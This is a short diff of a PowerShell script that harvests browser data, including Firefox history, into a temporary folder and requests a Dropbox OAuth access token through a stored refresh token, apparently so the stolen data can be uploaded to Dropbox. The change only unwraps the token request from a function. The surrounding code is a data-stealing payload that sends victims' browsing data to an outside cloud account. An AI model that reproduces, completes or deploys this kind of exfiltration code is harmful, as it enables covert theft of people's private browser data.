@@ -509,7 +509,6 @@ Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\B
 
 # Get DropBox access_token
 
-function get_access_token {
 $Body = @{
     grant_type    = "refresh_token"
     refresh_token = $refresh
@@ -520,9 +519,6 @@ $Body = @{
 $response = Invoke-RestMethod -Uri "https://api.dropbox.com/oauth2/token" -Method Post -Body $Body -ContentType "application/x-www-form-urlencoded"
 
 $db = $response.access_token
-}
-
-get_access_token
 
 ############################################################################################################################################################
 
